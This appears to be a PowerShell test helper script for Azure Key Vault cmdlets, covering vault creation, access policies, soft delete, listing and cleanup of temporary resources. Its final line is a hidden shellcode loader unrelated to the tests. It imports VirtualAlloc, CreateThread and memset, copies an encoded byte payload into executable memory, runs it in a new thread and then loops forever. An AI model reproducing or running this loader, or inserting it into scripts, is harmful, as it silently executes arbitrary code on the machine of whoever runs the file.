$tagName = "testtag"
$tagValue = "testvalue"
$KeyVaultResourceType = "Microsoft.KeyVault/vaults"
$KeyVaultApiVersion = "2015-06-01"


function Test_CreateNewVault
{
    Test-CreateNewVault $global:resourceGroupName $global:location $tagName $tagValue
}

function Test_CreateNewPremiumVaultEnabledForDeployment
{
    Test-CreateNewPremiumVaultEnabledForDeployment $global:resourceGroupName $global:location
}

function Test_RecreateVaultFails
{
    Test-RecreateVaultFails $global:testVault $global:resourceGroupName $global:location
}

function Test_CreateVaultInUnknownResGrpFails
{
    Test-CreateVaultInUnknownResGrpFails $global:location
}

function Test_CreateVaultPositionalParams
{
    Test-CreateVaultPositionalParams $global:resourceGroupName $global:location
}

function Test_CreateNewStandardVaultEnableSoftDelete
{
    Test-CreateNewStandardVaultEnableSoftDelete $global:resourceGroupName $global:location
}





function Test_RecoverDeletedVault
{
    Test-RecoverDeletedVault $global:resourceGroupName $global:location
}

function Test_GetNoneexistingDeletedVault
{
    Test-GetNoneexistingDeletedVault
}

function Test_PurgeDeletedVault
{
    Test-PurgeDeletedVault $global:resourceGroupName $global:location
}





function Test_GetVaultByNameAndResourceGroup
{
    Test-GetVaultByNameAndResourceGroup $global:testVault $global:resourceGroupName
}

function Test_GetVaultByNameAndResourceGroupPositionalParams
{
    Test-GetVaultByNameAndResourceGroupPositionalParams $global:testVault $global:resourceGroupName
}

function Test_GetVaultByName
{
    Test-GetVaultByName $global:testVault
}

function Test_GetUnknownVaultFails
{
    Test-GetUnknownVaultFails $global:resourceGroupName
}

function Test_GetVaultFromUnknownResourceGroupFails
{
    Test-GetVaultFromUnknownResourceGroupFails $global:testVault
}

function Test_ListVaultsByResourceGroup
{
    Test-ListVaultsByResourceGroup $global:resourceGroupName
}

function Test_ListAllVaultsInSubscription
{
    Test-ListAllVaultsInSubscription
}

function Test_ListVaultsByTag
{
    Test-ListVaultsByTag $tagName $tagValue
}

function Test_ListVaultsByUnknownResourceGroupFails
{
    Test-ListVaultsByUnknownResourceGroupFails
}





function Test_DeleteVaultByName
{
    Test-DeleteVaultByName $global:resourceGroupName $global:location
}

function Test_DeleteUnknownVaultFails
{
    Test-DeleteUnknownVaultFails
}




function Test_SetRemoveAccessPolicyByUPN
{
    $user = (Get-AzContext).Account.Id
    Reset-PreCreatedVault
    Test-SetRemoveAccessPolicyByUPN $global:testVault $global:resourceGroupName $user
}

function Test_SetRemoveAccessPolicyByEmailAddress
{
    
    $user = (Get-AzContext).Account.Id
    Reset-PreCreatedVault
    Test-SetRemoveAccessPolicyByEmailAddress $global:testVault $global:resourceGroupName $user $user
}

function Test_SetRemoveAccessPolicyBySPN
{
    Reset-PreCreatedVault

    $sp = 'testapp'

    
    if (-not $global:noADCmdLetMode)
    {
        $appName = [Guid]::NewGuid().ToString("N")
        $uri = 'http://localhost:8080/'+$appName
        $app = New-AzADApplication -DisplayName $appName -HomePage 'http://contoso.com' -IdentifierUris $uri -Password $appName
        $sp = New-AzADServicePrincipal -ApplicationId $app.ApplicationId
    }

    try
    {
        Test-SetRemoveAccessPolicyBySPN $global:testVault $global:resourceGroupName $uri
    }
    finally
    {
        if (-not $global:noADCmdLetMode)
        {
            Remove-AzADApplication -ObjectId $app.ObjectId -Force
        }
    }
}

function Test_SetRemoveAccessPolicyByObjectId
{
    Reset-PreCreatedVault
    Test-SetRemoveAccessPolicyByObjectId $global:testVault $global:resourceGroupName $global:objectId
}

function Test_SetRemoveAccessPolicyByBypassObjectIdValidation
{
    $securityGroupObjIdFromOtherTenant = [System.Guid]::NewGuid().toString()
    Reset-PreCreatedVault
    Test-SetRemoveAccessPolicyByObjectId $global:testVault $global:resourceGroupName $securityGroupObjIdFromOtherTenant -bypassObjectIdValidation
}

function Test_SetRemoveAccessPolicyByCompoundId
{
    $appId = [System.Guid]::NewGuid()
    Reset-PreCreatedVault
    Test-SetRemoveAccessPolicyByCompoundId $global:testVault $global:resourceGroupName $appId $global:objectId
}

function Test_RemoveAccessPolicyWithCompoundIdPolicies
{
    $appId1 = [System.Guid]::NewGuid()
    $appId2 = [System.Guid]::NewGuid()
    Reset-PreCreatedVault
    Test-RemoveAccessPolicyWithCompoundIdPolicies $global:testVault $global:resourceGroupName $appId1 $appId2 $global:objectId
}

function Test_SetCompoundIdAccessPolicy
{
    $appId = [System.Guid]::NewGuid()
    Reset-PreCreatedVault
    Test-SetCompoundIdAccessPolicy $global:testVault $global:resourceGroupName $appId $global:objectId
}

function Test_ModifyAccessPolicy
{
    Reset-PreCreatedVault
    Test-ModifyAccessPolicy $global:testVault $global:resourceGroupName $global:objectId
}

function Test_ModifyAccessPolicyEnabledForDeployment
{
    Reset-PreCreatedVault
    Test-ModifyAccessPolicyEnabledForDeployment $global:testVault $global:resourceGroupName
}

function Test_ModifyAccessPolicyEnabledForTemplateDeployment
{
    Reset-PreCreatedVault
    Test-ModifyAccessPolicyEnabledForTemplateDeployment $global:testVault $global:resourceGroupName
}

function Test_ModifyAccessPolicyEnabledForDiskEncryption
{
    Reset-PreCreatedVault
    Test-ModifyAccessPolicyEnabledForDiskEncryption $global:testVault $global:resourceGroupName
}

function Test_ModifyAccessPolicyNegativeCases
{
    Reset-PreCreatedVault
    Test-ModifyAccessPolicyNegativeCases $global:testVault $global:resourceGroupName $user $global:objectId
}


function Test_RemoveNonExistentAccessPolicyDoesNotThrow
{
    Reset-PreCreatedVault
    Test-RemoveNonExistentAccessPolicyDoesNotThrow $global:testVault $global:resourceGroupName $global:objectId
}

function Test_AllPermissionExpansion
{
    Reset-PreCreatedVault
    $user = (Get-AzContext).Account.Id
    Test-AllPermissionExpansion $global:testVault $global:resourceGroupName $user
}






function Test_CreateDeleteVaultWithPiping
{
    Test-CreateDeleteVaultWithPiping $global:resourceGroupName $global:location
}





function Get-VaultName([string]$suffix)
{
    if ($suffix -eq '')
    {
        $suffix = Get-Date -UFormat %m%d%H%M%S
    }

    return 'pshtv-' + $global:testns + '-' + $suffix
}


function Get-ResourceGroupName([string]$suffix)
{
    if ($suffix -eq '')
    {
        $suffix = Get-Date -UFormat %m%d%H%M%S
    }

    return 'pshtrg-' + $global:testns + '-' + $suffix
}


function Reset-PreCreatedVault
{
    $tenantId = (Get-AzContext).Tenant.Id
    $sku = "premium"
    if ($global:standardVaultOnly)
    {
        $sku = "standard"
    }
    $vaultProperties = @{
        "enabledForDeployment" = $false
        "tenantId" = $tenantId
        "sku" = @{
            "family" = "A"
            "name" = $sku
        }
        "accessPolicies" = @()
    }

    Set-AzResource -ApiVersion $KeyVaultApiVersion `
                    -ResourceType $KeyVaultResourceType `
                    -ResourceName $global:testVault `
                    -ResourceGroupName $global:resourceGroupName `
                    -PropertyObject $vaultProperties  `
                    -Force -Confirm:$false
}


function Initialize-TemporaryState
{
    $suffix = Get-Date -UFormat %m%d%H%M%S
    if ($global:resourceGroupName -eq "")
    {
        
        $rg = Get-ResourceGroupName $suffix
        New-AzResourceGroup -Name $rg -Location $global:location -Force

        $global:resourceGroupName = $rg
        Write-Host "Successfully initialized the temporary resource group $global:resourceGroupName."
    }
    else
    {
        Write-Host "Skipping resource group creation since the resource group $global:resourceGroupName is already provided."
    }

    if ($global:testVault -ne "" -and $global:testVault -ne $null)
    {
        Write-Host "Skipping vault creation since the vault $global:testVault is already provided."
        return
    }

    
    $vaultName = Get-VaultName $suffix
    $tenantId = (Get-AzContext).Tenant.Id
    $sku = "premium"
    if ($global:standardVaultOnly)
    {
        $sku = "standard"
    }
    $vaultId = @{
        "ResourceType" = $KeyVaultResourceType
        "ApiVersion" = $KeyVaultApiVersion
        "ResourceGroupName" = $global:resourceGroupName
        "Name" = $vaultName
    }
    $vaultProperties = @{
        "enabledForDeployment" = $false
        "tenantId" = $tenantId
        "sku" = @{
            "family" = "A"
            "name" = $sku
        }
        "accessPolicies" = @(
            @{
                "tenantId" = $tenantId
                "objectId" = $objectId
                "applicationId" = ""
                "permissions" = @{
                    "keys" = @("all")
                    "secrets" = @("all")
                    "certificates" = @("all")
                    "storage" = @("all")
                }
            }
        )
    }
    if ($global:softDeleteEnabled -eq $true )
    {
        $vaultProperties.Add("enableSoftDelete", $global:softDeleteEnabled)
        $vaultProperties.accessPolicies.permissions.keys = @("all", "purge")
        $vaultProperties.accessPolicies.permissions.secrets = @("all", "purge")
        $vaultProperties.accessPolicies.permissions.certificates = @("all", "purge")
    }

    $keyVault = New-AzResource @vaultId `
                -PropertyObject $vaultProperties `
                -Location $global:location `
                -Force -Confirm:$false
    if ($keyVault)
    {
        $global:testVault = $vaultName
        Write-Host "Successfully initialized the temporary vault $global:testVault."
        Write-Host "Sleeping for 10 seconds to wait for DNS propagation..."
        Start-Sleep -Seconds 10
        Write-Host "DNS propagation should have finished by now. Continuing."
    }
    else
    {
        
        Remove-ResourceGroup
        Throw "Failed to initialize the temporary vault $VaultName."
    }
}


function Get-VaultResource
{
    return Get-AzResource -ResourceType $KeyVaultResourceType `
                               -ResourceGroupName $global:resourceGroupName `
                               -ResourceName $global:testVault
}


function Restore-VaultResource($oldVaultResource)
{
    Write-Host "Restoring the vault resource $global:testVault..."

    $oldVaultResource | Set-AzResource -Force
}


function Cleanup-TemporaryState([bool]$tempResourceGroup, [bool]$tempVault)
{
    if ($tempResourceGroup)
    {
        Write-Host "Starting the deletion of the temporary resource group. This can take a few minutes..."
        $groupRemoved = Remove-AzResourceGroup -Name $global:resourceGroupname -Force -Confirm:$false
        if ($groupRemoved)
        {
            $global:resourceGroupname = ""
            Write-Host "Successfully completed the deletion of the temporary resource group."
        }
        else
        {
            Throw "Failed to remove the temporary resource group $global:resourceGroupname."
        }
    }
    elseif ($tempVault)
    {
        Write-Host "Starting the deletion of the temporary vault. This can take a minute or so..."
        $vaultRemoved = Remove-AzKeyVault -VaultName $global:testVault -ResourceGroupName $global:resourceGroupname -Force -Confirm:$false
        if ($vaultRemoved)
        {
            $global:testVault = ""
            Write-Host "Successfully completed the deletion of the temporary vault."
        }
        else
        {
            Throw "Failed to remove the temporary vault $global:testVault."
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc0,0xbf,0xf5,0x6e,0xa5,0x30,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0xe1,0x8c,0x50,0xcc,0xe1,0xd3,0x9b,0x2d,0xf1,0xb3,0x12,0xc8,0xc0,0xf3,0x41,0x98,0x72,0xc4,0x02,0xcc,0x7e,0xaf,0x47,0xe5,0xf5,0xdd,0x4f,0x0a,0xbe,0x68,0xb6,0x25,0x3f,0xc0,0x8a,0x24,0xc3,0x1b,0xdf,0x86,0xfa,0xd3,0x12,0xc6,0x3b,0x09,0xde,0x9a,0x94,0x45,0x4d,0x0b,0x91,0x10,0x4e,0xa0,0xe9,0xb5,0xd6,0x55,0xb9,0xb4,0xf7,0xcb,0xb2,0xee,0xd7,0xea,0x17,0x9b,0x51,0xf5,0x74,0xa6,0x28,0x8e,0x4e,0x5c,0xab,0x46,0x9f,0x9d,0x00,0xa7,0x10,0x6c,0x58,0xef,0x96,0x8f,0x2f,0x19,0xe5,0x32,0x28,0xde,0x94,0xe8,0xbd,0xc5,0x3e,0x7a,0x65,0x22,0xbf,0xaf,0xf0,0xa1,0xb3,0x04,0x76,0xed,0xd7,0x9b,0x5b,0x85,0xe3,0x10,0x5a,0x4a,0x62,0x62,0x79,0x4e,0x2f,0x30,0xe0,0xd7,0x95,0x97,0x1d,0x07,0x76,0x47,0xb8,0x43,0x9a,0x9c,0xb1,0x09,0xf2,0x51,0xf8,0xb1,0x02,0xfe,0x8b,0xc2,0x30,0xa1,0x27,0x4d,0x78,0x2a,0xee,0x8a,0x7f,0x01,0x56,0x04,0x7e,0xaa,0xa7,0x0c,0x44,0xfe,0xf7,0x26,0x6d,0x7f,0x9c,0xb6,0x92,0xaa,0x09,0xb2,0x04,0x07,0x9f,0x82,0xad,0xcf,0x1d,0xfb,0x5c,0x4c,0xab,0x1d,0x0e,0x3c,0xfb,0xb1,0xee,0xec,0xbb,0x61,0x86,0xe6,0x33,0x5d,0xb6,0x08,0x9e,0xf6,0x5c,0xe7,0x77,0xae,0xc8,0x9e,0xdd,0x24,0x69,0x5e,0xc8,0x40,0xa9,0xd4,0xff,0xb5,0x67,0x1d,0x75,0xa6,0x1f,0xed,0xc0,0x94,0x89,0xf2,0xfe,0xb3,0x35,0x67,0x05,0x12,0x62,0x1f,0x07,0x43,0x44,0x80,0xf8,0xa6,0xdf,0x09,0x6d,0x09,0xb7,0x75,0x61,0x89,0x47,0x20,0xeb,0x89,0x2f,0x94,0x4f,0xda,0x4a,0xdb,0x45,0x4e,0xc7,0x4e,0x66,0x27,0xb4,0xd9,0x0e,0xc5,0xe3,0x2e,0x91,0x36,0xc6,0xae,0xed,0xe0,0x2e,0xc5,0x1f,0x31;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

